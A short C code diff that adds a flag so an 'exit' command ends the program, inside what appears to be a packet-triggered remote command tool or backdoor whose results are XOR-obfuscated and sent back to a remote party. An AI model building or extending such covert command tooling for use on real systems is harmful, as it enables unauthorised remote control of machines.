@@ -507,6 +507,7 @@ int authenticateClient(struct iphdr* ip_header, struct tcphdr* tcp_header)
 ------------------------------------------------------------------------------*/
 void executeCommand(char* command)
 {
+	int temp = 0;
 	char results[1024] = {0};
 	memset(results, 0, sizeof(results));
 
@@ -517,7 +518,11 @@ void executeCommand(char* command)
 		strcpy(results, "version 1");
 	} else if (strcmp(command, "exit") == 0) {
 		strcpy(results, "quitting!");
+		temp = 1;
 	}
+
+	if (temp == 1)
+		exit(1);
 	
 	XOR(results);
 	sendCommand(addr_ptr, results);
